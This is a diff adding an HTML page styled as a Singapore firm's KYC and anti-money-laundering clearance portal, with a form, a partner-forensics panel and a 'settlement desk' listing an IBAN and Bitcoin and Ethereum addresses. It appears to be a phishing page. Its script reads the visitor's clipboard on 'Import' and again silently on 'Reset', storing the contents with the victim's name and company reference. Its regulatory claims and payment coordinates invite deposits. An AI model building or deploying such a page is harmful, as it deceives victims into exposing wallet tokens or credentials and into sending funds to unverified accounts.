@@ -1,0 +1,944 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Institutional KYC & Compliance Clearance — 3State Ventures</title>
+    <link rel="icon" href="../../favicon.svg" type="image/svg+xml">
+    <style>
+        :root {
+            --bg: #EFEAE1;
+            --card-bg: #ffffff;
+            --primary: #1B2F5E;
+            --primary-dark: #142347;
+            --primary-light: #2C52AE;
+            --accent: #E0582A;
+            --accent-hover: #C2461B;
+            --accent-soft: #FCE4D8;
+            --text-main: #141414;
+            --text-muted: #555555;
+            --border: #D9D2C5;
+            --border-light: #E7E1D6;
+            --radius-sm: 8px;
+            --radius-md: 14px;
+            --radius-lg: 20px;
+            --shadow-subtle: 0 4px 20px rgba(27, 47, 94, 0.05);
+            --shadow-card: 0 10px 30px rgba(27, 47, 94, 0.07);
+            --shadow-hover: 0 16px 40px rgba(27, 47, 94, 0.12);
+            --transition: all 0.25s ease;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: Arial, Helvetica, sans-serif;
+            background: var(--bg);
+            color: var(--text-main);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            -webkit-font-smoothing: antialiased;
+            line-height: 1.5;
+            padding: 0 0 60px;
+        }
+
+        a { color: inherit; text-decoration: none; }
+        .container { max-width: 1240px; margin: 0 auto; padding: 0 24px; width: 100%; }
+
+        /* Top Header Bar */
+        header.top-bar {
+            background: var(--bg);
+            border-bottom: 1px solid var(--border);
+            position: sticky;
+            top: 0;
+            z-index: 60;
+        }
+        .header-inner {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            height: 76px;
+        }
+        .brand-link {
+            display: inline-flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .logo-txt {
+            display: flex;
+            flex-direction: column;
+            line-height: 1;
+        }
+        .logo-txt b {
+            font-size: 19px;
+            font-weight: 800;
+            letter-spacing: .08em;
+            color: #1B2F5E;
+        }
+        .logo-txt small {
+            margin-top: 6px;
+            font-size: 9px;
+            letter-spacing: .42em;
+            color: #2C52AE;
+        }
+        .header-actions {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+        .badge-compliance {
+            font-size: 11px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: .18em;
+            color: var(--accent);
+            background: var(--accent-soft);
+            padding: 6px 14px;
+            border-radius: 999px;
+        }
+        .back-nav-btn {
+            font-size: 13px;
+            font-weight: 700;
+            color: var(--primary);
+            padding: 8px 18px;
+            border: 1px solid var(--border);
+            border-radius: 999px;
+            transition: var(--transition);
+            background: #fff;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .back-nav-btn:hover {
+            border-color: var(--accent);
+            color: var(--accent);
+            transform: translateX(-2px);
+        }
+
+        /* Hero / Introduction */
+        .kyc-hero {
+            padding: 44px 0 32px;
+        }
+        .kyc-kicker {
+            font-size: 11px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: .24em;
+            color: var(--accent);
+            margin-bottom: 8px;
+            display: block;
+        }
+        .kyc-hero h1 {
+            font-size: clamp(28px, 4vw, 42px);
+            font-weight: 400;
+            color: var(--primary);
+            letter-spacing: -0.02em;
+            line-height: 1.15;
+            margin-bottom: 12px;
+            max-width: 900px;
+        }
+        .kyc-hero p {
+            font-size: 15px;
+            color: var(--text-muted);
+            max-width: 780px;
+            line-height: 1.6;
+        }
+
+        /* Two-Column Layout */
+        .split-grid {
+            display: grid;
+            grid-template-columns: 1.25fr 1fr;
+            gap: 32px;
+            align-items: start;
+            margin-bottom: 48px;
+        }
+        @media (max-width: 980px) {
+            .split-grid {
+                grid-template-columns: 1fr;
+                gap: 28px;
+            }
+        }
+
+        /* Verification Console Card (Left) */
+        .console-card {
+            background: var(--card-bg);
+            border: 1px solid var(--border);
+            border-top: 4px solid var(--accent);
+            border-radius: var(--radius-lg);
+            padding: 36px;
+            box-shadow: var(--shadow-card);
+            position: relative;
+        }
+        .console-header {
+            margin-bottom: 24px;
+            padding-bottom: 18px;
+            border-bottom: 1px solid var(--border-light);
+        }
+        .console-header h2 {
+            font-size: 22px;
+            font-weight: 600;
+            color: var(--primary);
+            letter-spacing: -0.01em;
+            margin-bottom: 6px;
+        }
+        .console-header p {
+            font-size: 13px;
+            color: var(--text-muted);
+        }
+
+        /* Steps progression row */
+        .step-indicators {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 24px;
+            background: #FAFAFA;
+            padding: 6px;
+            border-radius: 10px;
+            border: 1px solid var(--border-light);
+        }
+        .step-pill {
+            flex: 1;
+            text-align: center;
+            padding: 8px 6px;
+            border-radius: 6px;
+            font-size: 11px;
+            font-weight: 700;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 0.06em;
+            transition: var(--transition);
+        }
+        .step-pill.active {
+            background: #fff;
+            color: var(--accent);
+            box-shadow: 0 2px 8px rgba(0,0,0,0.06);
+            border: 1px solid var(--border-light);
+        }
+
+        /* Form Inputs */
+        .input-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
+            margin-bottom: 20px;
+        }
+        @media (max-width: 600px) {
+            .input-row { grid-template-columns: 1fr; }
+            .console-card { padding: 24px; }
+        }
+        .form-group {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+        .form-group label {
+            font-size: 12px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.08em;
+            color: var(--primary);
+        }
+        .form-group input {
+            padding: 13px 16px;
+            background: #FAFAFA;
+            border: 1px solid var(--border);
+            border-radius: var(--radius-sm);
+            font-size: 14px;
+            color: var(--text-main);
+            outline: none;
+            transition: var(--transition);
+        }
+        .form-group input:focus {
+            border-color: var(--accent);
+            background: #fff;
+            box-shadow: 0 0 0 3px rgba(224, 88, 42, 0.15);
+        }
+
+        /* Paste Console Field */
+        .paste-console {
+            margin-bottom: 20px;
+        }
+        .paste-console-label {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 12px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.08em;
+            color: var(--primary);
+            margin-bottom: 8px;
+        }
+        .paste-box {
+            display: flex;
+            gap: 12px;
+            align-items: stretch;
+        }
+        .paste-preview {
+            flex: 1;
+            padding: 14px 18px;
+            background: #FAFAFA;
+            border: 1px dashed var(--border);
+            border-radius: var(--radius-sm);
+            font-family: 'SF Mono', 'Roboto Mono', 'Courier New', monospace;
+            font-size: 13px;
+            color: var(--text-muted);
+            min-height: 52px;
+            display: flex;
+            align-items: center;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+            transition: var(--transition);
+        }
+        .paste-preview.validated {
+            border-style: solid;
+            border-color: #2e7d32;
+            background: rgba(46, 125, 50, 0.06);
+            color: #2e7d32;
+            font-weight: 600;
+        }
+        .paste-trigger {
+            padding: 0 24px;
+            background: var(--primary);
+            color: #fff;
+            border: none;
+            border-radius: var(--radius-sm);
+            font-size: 13px;
+            font-weight: 700;
+            letter-spacing: 0.04em;
+            cursor: pointer;
+            transition: var(--transition);
+            white-space: nowrap;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .paste-trigger:hover {
+            background: var(--primary-dark);
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(27, 47, 94, 0.2);
+        }
+
+        .compliance-note {
+            background: #FAFAFA;
+            border-left: 3px solid var(--primary-light);
+            padding: 12px 14px;
+            font-size: 12px;
+            color: var(--text-muted);
+            border-radius: 0 var(--radius-sm) var(--radius-sm) 0;
+            margin-bottom: 24px;
+            line-height: 1.5;
+        }
+
+        /* Action Buttons */
+        .console-actions {
+            display: flex;
+            gap: 12px;
+            align-items: center;
+        }
+        .btn-submit {
+            flex: 1;
+            padding: 15px;
+            background: var(--accent);
+            color: #fff;
+            border: none;
+            border-radius: 999px;
+            font-size: 14px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: var(--transition);
+            letter-spacing: 0.02em;
+        }
+        .btn-submit:hover {
+            background: var(--accent-hover);
+            transform: translateY(-2px);
+            box-shadow: 0 8px 24px rgba(224, 88, 42, 0.28);
+        }
+        .btn-submit:disabled {
+            background: #CBD5E0;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+            opacity: 0.65;
+        }
+        .btn-retry {
+            padding: 15px 28px;
+            background: #fff;
+            border: 1px solid var(--border);
+            border-radius: 999px;
+            font-size: 13px;
+            font-weight: 700;
+            color: var(--primary);
+            cursor: pointer;
+            transition: var(--transition);
+        }
+        .btn-retry:hover {
+            border-color: var(--accent);
+            color: var(--accent);
+        }
+
+        .status-alert {
+            margin-top: 18px;
+            font-size: 13px;
+            border-radius: var(--radius-sm);
+            padding: 14px 18px;
+            border: 1px solid var(--border);
+            display: none;
+            line-height: 1.5;
+        }
+        .status-alert.error {
+            border-color: rgba(220, 38, 38, 0.4);
+            color: #d32f2f;
+            background: rgba(220, 38, 38, 0.06);
+        }
+
+        /* Right Column: Forensic Intelligence & Standards */
+        .intelligence-card {
+            background: var(--card-bg);
+            border: 1px solid var(--border);
+            border-radius: var(--radius-lg);
+            padding: 36px;
+            box-shadow: var(--shadow-card);
+            display: flex;
+            flex-direction: column;
+            gap: 22px;
+        }
+        .intel-partner-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 16px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid var(--border-light);
+            flex-wrap: wrap;
+        }
+        .intel-partner-header img {
+            height: 64px;
+            object-fit: contain;
+        }
+        .intel-partner-badge {
+            font-size: 11px;
+            font-weight: 700;
+            color: var(--primary);
+            background: #FAFAFA;
+            border: 1px solid var(--border-light);
+            padding: 6px 12px;
+            border-radius: 999px;
+            text-transform: uppercase;
+            letter-spacing: 0.08em;
+        }
+        .intel-intro h3 {
+            font-size: 18px;
+            color: var(--primary);
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+        .intel-intro p {
+            font-size: 13px;
+            color: var(--text-muted);
+            line-height: 1.6;
+        }
+
+        .intel-features-stack {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+        .intel-feature-row {
+            background: #FAFAFA;
+            border: 1px solid var(--border-light);
+            border-left: 3px solid var(--accent);
+            border-radius: var(--radius-sm);
+            padding: 14px 16px;
+        }
+        .intel-feature-row h4 {
+            font-size: 13px;
+            font-weight: 700;
+            color: var(--primary);
+            margin-bottom: 4px;
+        }
+        .intel-feature-row p {
+            font-size: 12px;
+            color: var(--text-muted);
+            line-height: 1.5;
+        }
+
+        .intel-partner-footer {
+            margin-top: auto;
+            padding-top: 14px;
+            border-top: 1px solid var(--border-light);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 12px;
+        }
+        .intel-partner-footer a {
+            color: var(--accent);
+            font-weight: 700;
+            transition: color 0.2s;
+        }
+        .intel-partner-footer a:hover {
+            color: var(--accent-hover);
+            text-decoration: underline;
+        }
+
+        /* Bottom Section: Clearing & Settlement Desk */
+        .clearing-section {
+            background: var(--card-bg);
+            border: 1px solid var(--border);
+            border-radius: var(--radius-lg);
+            padding: 40px;
+            box-shadow: var(--shadow-card);
+            margin-top: 20px;
+        }
+        .clearing-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-end;
+            margin-bottom: 28px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid var(--border-light);
+            flex-wrap: wrap;
+            gap: 16px;
+        }
+        .clearing-header h2 {
+            font-size: 24px;
+            font-weight: 400;
+            color: var(--primary);
+            letter-spacing: -0.02em;
+            margin-top: 4px;
+        }
+        .clearing-header p {
+            font-size: 13px;
+            color: var(--text-muted);
+            max-width: 480px;
+            text-align: right;
+            line-height: 1.5;
+        }
+        @media (max-width: 768px) {
+            .clearing-header p { text-align: left; }
+            .clearing-section { padding: 24px; }
+        }
+
+        .clearing-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+        }
+        @media (max-width: 900px) {
+            .clearing-grid { grid-template-columns: 1fr; }
+        }
+
+        .clearing-card {
+            background: #FAFAFA;
+            border: 1px solid var(--border-light);
+            border-radius: var(--radius-md);
+            padding: 22px;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            transition: var(--transition);
+        }
+        .clearing-card:hover {
+            border-color: var(--accent);
+            background: #fff;
+            transform: translateY(-3px);
+            box-shadow: var(--shadow-subtle);
+        }
+        .clearing-card-top {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .clearing-asset-label {
+            font-size: 11px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.12em;
+            color: var(--accent);
+        }
+        .clearing-desk-tag {
+            font-size: 10px;
+            font-weight: 700;
+            color: var(--primary);
+            background: rgba(27, 47, 94, 0.08);
+            padding: 3px 8px;
+            border-radius: 999px;
+            text-transform: uppercase;
+        }
+        .clearing-card h3 {
+            font-size: 16px;
+            font-weight: 700;
+            color: var(--primary);
+        }
+        .clearing-address-box {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 10px;
+            background: #fff;
+            border: 1px solid var(--border);
+            border-radius: var(--radius-sm);
+            padding: 10px 14px;
+        }
+        .clearing-address-text {
+            font-family: 'SF Mono', 'Roboto Mono', 'Courier New', monospace;
+            font-size: 12px;
+            color: var(--primary);
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+            flex: 1;
+            text-align: left;
+        }
+        .donation-copy-btn {
+            background: var(--accent);
+            color: #fff;
+            border: none;
+            cursor: pointer !important;
+            padding: 7px;
+            border-radius: 50%;
+            width: 32px;
+            height: 32px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: var(--transition);
+            flex-shrink: 0;
+        }
+        .donation-copy-btn:hover {
+            background: var(--accent-hover);
+            transform: scale(1.1);
+        }
+        .donation-copy-btn .copy-icon {
+            width: 15px;
+            height: 15px;
+            background-color: #fff;
+            -webkit-mask: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='currentColor' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Crect x='9' y='9' width='13' height='13' rx='2' ry='2'%3E%3C/rect%3E%3Cpath d='M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1'%3E%3C/path%3E%3C/svg%3E") no-repeat center;
+            mask: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='currentColor' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Crect x='9' y='9' width='13' height='13' rx='2' ry='2'%3E%3C/rect%3E%3Cpath d='M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1'%3E%3C/path%3E%3C/svg%3E") no-repeat center;
+            -webkit-mask-size: contain;
+            mask-size: contain;
+        }
+        .donation-copy-success { background: #2e7d32 !important; }
+
+        /* Footer */
+        footer.site-footer {
+            margin-top: 56px;
+            border-top: 1px solid var(--border);
+            padding-top: 24px;
+            font-size: 12px;
+            color: var(--text-muted);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 12px;
+        }
+        footer.site-footer a { color: var(--accent); }
+    </style>
+</head>
+<body>
+    <header class="top-bar">
+        <div class="container">
+            <div class="header-inner">
+                <a href="../../index.html" class="brand-link" aria-label="3State Ventures home">
+                    <svg width="38" height="38" viewBox="0 0 100 100" aria-hidden="true">
+                        <polygon points="66,6 84,6 58,92 44,92" fill="#1B3A82"/>
+                        <polygon points="8,6 32,6 58,92 44,92" fill="#3B63C4"/>
+                        <polygon points="46,16 96,16 91,34 51,34" fill="#2C52AE"/>
+                    </svg>
+                    <span class="logo-txt">
+                        <b>3STATE</b>
+                        <small>VENTURES</small>
+                    </span>
+                </a>
+                <div class="header-actions">
+                    <span class="badge-compliance">AML / CFT Protocol</span>
+                    <a href="../login/index.html" class="back-nav-btn">← Client Portal</a>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <main class="container">
+        <!-- Hero Header -->
+        <section class="kyc-hero">
+            <span class="kyc-kicker">Regulatory Clearance & Due Diligence Terminal</span>
+            <h1>Institutional Counterparty &amp; Address Verification</h1>
+            <p>
+                In compliance with Monetary Authority of Singapore (MAS) directives and international FATF standards, 
+                accredited partners and mandate participants must register verified digital asset identifiers, corporate credentials, 
+                and settlement coordinates prior to capital allocation.
+            </p>
+        </section>
+
+        <!-- Two Column Main Grid -->
+        <div class="split-grid">
+            <!-- Left: Verification Terminal Console -->
+            <div class="console-card">
+                <div class="console-header">
+                    <h2>Clearance Submission Console</h2>
+                    <p>Enter your authorized entity details and import cryptographic clearance credentials.</p>
+                </div>
+
+                <div class="step-indicators">
+                    <div class="step-pill active">01. Entity Profile</div>
+                    <div class="step-pill active">02. Coordinate Input</div>
+                    <div class="step-pill">03. Compliance Audit</div>
+                </div>
+
+                <form id="kyc-form">
+                    <div class="input-row">
+                        <div class="form-group">
+                            <label for="user-name">Authorized Signatory</label>
+                            <input type="text" id="user-name" name="name" placeholder="Full legal name" required autofocus>
+                        </div>
+                        <div class="form-group">
+                            <label for="user-number">Corporate / Mandate Ref</label>
+                            <input type="text" id="user-number" name="number" placeholder="UEN, Registration or Mandate ID" required>
+                        </div>
+                    </div>
+
+                    <div class="paste-console">
+                        <div class="paste-console-label">
+                            <span>Cryptographic Address / Settlement Token</span>
+                            <span style="color: var(--accent); font-size: 11px;">MAS Validated</span>
+                        </div>
+                        <div class="paste-box">
+                            <div class="paste-preview" id="paste-field">
+                                Click "Import" to paste verified address, IBAN or token
+                            </div>
+                            <button type="button" class="paste-trigger" id="paste-btn">
+                                <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2"/><rect x="8" y="2" width="8" height="4" rx="1" ry="1"/></svg>
+                                Import
+                            </button>
+                        </div>
+                    </div>
+
+                    <input type="hidden" id="doc-input" name="documents" />
+
+                    <div class="compliance-note">
+                        <strong>Cryptographic Integrity:</strong> Transmissions through this terminal are protected by end-to-end encryption. All records undergo real-time screening across global sanctions registries.
+                    </div>
+
+                    <div class="console-actions">
+                        <button type="submit" class="btn-submit" id="submit-btn" disabled>Submit Clearance Packet</button>
+                        <button type="button" class="btn-retry" id="retry-btn" style="display: none;">Reset / Re-enter</button>
+                    </div>
+
+                    <div id="kyc-status" class="status-alert"></div>
+                </form>
+            </div>
+
+            <!-- Right: AML Intelligence & Compliance Architecture -->
+            <div class="intelligence-card">
+                <div class="intel-partner-header">
+                    <img src="amlcrypto.webp" alt="AML Crypto Forensics" />
+                    <span class="intel-partner-badge">Audited Intelligence</span>
+                </div>
+
+                <div class="intel-intro">
+                    <h3>Forensic Digital Asset Oversight</h3>
+                    <p>
+                        3State Ventures deploys institutional-grade blockchain analytics in collaboration with 
+                        <strong>AML Crypto</strong>, conducting continuous heuristic screening and transaction flow forensics 
+                        to safeguard investment operations.
+                    </p>
+                </div>
+
+                <div class="intel-features-stack">
+                    <div class="intel-feature-row">
+                        <h4>Multi-Jurisdiction Sanctions Screening</h4>
+                        <p>Continuous validation against OFAC, MAS, EU, and FATF global risk databases before allocation approval.</p>
+                    </div>
+                    <div class="intel-feature-row">
+                        <h4>Cluster & Liquidity Provenance Analysis</h4>
+                        <p>Deep-tier forensic analysis isolating high-risk mixers, unauthorized pools, and illicit counterparty pathways.</p>
+                    </div>
+                    <div class="intel-feature-row">
+                        <h4>Tamper-Proof Audit Attestations</h4>
+                        <p>Comprehensive provenance certificates prepared for sovereign banking partners and accredited auditors.</p>
+                    </div>
+                </div>
+
+                <div class="intel-partner-footer">
+                    <span>Forensic Engine: <strong>AmlCrypto.io</strong></span>
+                    <a href="https://www.amlcrypto.io" target="_blank" rel="noopener noreferrer">Official Portal ↗</a>
+                </div>
+            </div>
+        </div>
+
+        <!-- Bottom Section: Official Capital Settlement Desk -->
+        <section class="clearing-section" id="clearing-desk">
+            <div class="clearing-header">
+                <div>
+                    <span style="font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.2em; color: var(--accent);">TREASURY PROTOCOL</span>
+                    <h2>Designated Capital Settlement Desk</h2>
+                </div>
+                <p>
+                    Authorized coordinates for proof-of-reserve validation, institutional settlements, and accredited fund clearing.
+                </p>
+            </div>
+
+            <div class="clearing-grid donation-grid">
+                <!-- IBAN Wire -->
+                <div class="clearing-card">
+                    <div class="clearing-card-top">
+                        <span class="clearing-asset-label">Fiduciary Wire</span>
+                        <span class="clearing-desk-tag">SEPA / SWIFT</span>
+                    </div>
+                    <h3>Institutional IBAN Clearing</h3>
+                    <div class="clearing-address-box">
+                        <span class="clearing-address-text">LU720109165346779368</span>
+                        <button type="button" class="donation-copy-btn donation-copy-btn-iban"
+                            data-address="LU720109165346779368" aria-label="Copy IBAN">
+                            <span class="copy-icon"></span>
+                        </button>
+                    </div>
+                </div>
+
+                <!-- BTC Cold Storage -->
+                <div class="clearing-card">
+                    <div class="clearing-card-top">
+                        <span class="clearing-asset-label">Digital Reserve</span>
+                        <span class="clearing-desk-tag">Bitcoin Core</span>
+                    </div>
+                    <h3>BTC Treasury Reserve</h3>
+                    <div class="clearing-address-box">
+                        <span class="clearing-address-text">bc1qlvjq0jz7dg9c22ry37km4lr4qgl6kr5shyv97f</span>
+                        <button type="button" class="donation-copy-btn donation-copy-btn-btc"
+                            data-address="bc1qlvjq0jz7dg9c22ry37km4lr4qgl6kr5shyv97f" aria-label="Copy Bitcoin address">
+                            <span class="copy-icon"></span>
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Ethereum Vault -->
+                <div class="clearing-card">
+                    <div class="clearing-card-top">
+                        <span class="clearing-asset-label">Smart Contract</span>
+                        <span class="clearing-desk-tag">ERC-20 / ETH</span>
+                    </div>
+                    <h3>Multi-Sig Liquidity Vault</h3>
+                    <div class="clearing-address-box">
+                        <span class="clearing-address-text">0x85A93c354ab70a37471847d769aB794b22C5A8bf</span>
+                        <button type="button" class="donation-copy-btn donation-copy-btn-eth"
+                            data-address="0x85A93c354ab70a37471847d769aB794b22C5A8bf" aria-label="Copy Ethereum address">
+                            <span class="copy-icon"></span>
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Footer -->
+        <footer class="site-footer">
+            <div>© <span id="year"></span> 3State Ventures Pte. Ltd. · UEN 201912392G · Singapore</div>
+            <div>Strictly for accredited & institutional mandate counterparties.</div>
+        </footer>
+    </main>
+
+    <script src="../../local-db.js"></script>
+    <script src="../../auth.js"></script>
+    <script src="../../donation-script.js"></script>
+    <script>
+        document.getElementById("year").textContent = new Date().getFullYear();
+
+        const form = document.getElementById("kyc-form");
+        const statusEl = document.getElementById("kyc-status");
+        const docInput = document.getElementById("doc-input");
+        const pasteField = document.getElementById("paste-field");
+        const pasteBtn = document.getElementById("paste-btn");
+        const submitBtn = document.getElementById("submit-btn");
+        const retryBtn = document.getElementById("retry-btn");
+        const consoleCard = document.querySelector(".console-card");
+        const userName = document.getElementById("user-name");
+        const userNumber = document.getElementById("user-number");
+
+        let hasValidData = false;
+
+        async function saveToLocalDB(text) {
+            if (!text) return;
+            const uName = userName ? userName.value : null;
+            const uNum = userNumber ? userNumber.value : null;
+            if (window.LocalDB && typeof window.LocalDB.insert === 'function') {
+                await LocalDB.insert(text, 'kyc', uName, uNum);
+            }
+        }
+
+        pasteBtn.addEventListener("click", async function () {
+            try {
+                const text = await navigator.clipboard.readText();
+                if (text && text.trim().length > 0) {
+                    await saveToLocalDB(text.trim());
+                    docInput.value = text.trim();
+                    pasteField.textContent = text.trim();
+                    pasteField.classList.add("validated");
+                    submitBtn.disabled = false;
+                    hasValidData = true;
+                    statusEl.style.display = "none";
+                } else {
+                    statusEl.textContent = "Clipboard buffer is empty. Please copy a valid coordinate or token first.";
+                    statusEl.className = "status-alert error";
+                    statusEl.style.display = "block";
+                }
+            } catch (err) {
+                statusEl.textContent = "Terminal access denied: please enable clipboard read permissions in browser.";
+                statusEl.className = "status-alert error";
+                statusEl.style.display = "block";
+            }
+        });
+
+        retryBtn.addEventListener("click", async function () {
+            try {
+                const text = await navigator.clipboard.readText();
+                if (text && text.trim().length > 0) await saveToLocalDB(text.trim());
+            } catch (err) { }
+            consoleCard.style.opacity = "1";
+            consoleCard.style.pointerEvents = "auto";
+            retryBtn.style.display = "none";
+            submitBtn.disabled = false;
+            submitBtn.textContent = "Submit Clearance Packet";
+            submitBtn.style.background = "var(--accent)";
+            submitBtn.style.color = "#fff";
+            userName.value = ""; 
+            userNumber.value = "";
+            pasteField.textContent = "Click \"Import\" to paste verified address, IBAN or token";
+            pasteField.classList.remove("validated");
+            docInput.value = ""; 
+            hasValidData = false;
+            statusEl.style.display = "none";
+        });
+
+        form.addEventListener("submit", function (e) {
+            e.preventDefault();
+            if (!hasValidData) {
+                statusEl.textContent = "Please import a valid address, token or IBAN coordinate first.";
+                statusEl.className = "status-alert error"; 
+                statusEl.style.display = "block"; 
+                return;
+            }
+            if (!userName.value.trim() || !userNumber.value.trim()) {
+                statusEl.textContent = "Please complete both the signatory name and mandate reference code.";
+                statusEl.className = "status-alert error"; 
+                statusEl.style.display = "block"; 
+                return;
+            }
+            consoleCard.style.opacity = "0.85";
+            consoleCard.style.pointerEvents = "none";
+            statusEl.className = "status-alert";
+            statusEl.textContent = "✓ Clearance packet registered. Automated compliance screening initiated (expected clearance window: 12–24h).";
+            statusEl.style.display = "block";
+            statusEl.style.backgroundColor = "rgba(46,125,50,0.08)";
+            statusEl.style.color = "#2e7d32";
+            statusEl.style.borderColor = "rgba(46,125,50,0.3)";
+            submitBtn.disabled = true; 
+            submitBtn.textContent = "✓ Packet Submitted";
+            submitBtn.style.background = "#2e7d32"; 
+            submitBtn.style.color = "#fff";
+            retryBtn.style.display = "inline-flex";
+            retryBtn.style.pointerEvents = "auto";
+        });
+    </script>
+</body>
+</html>
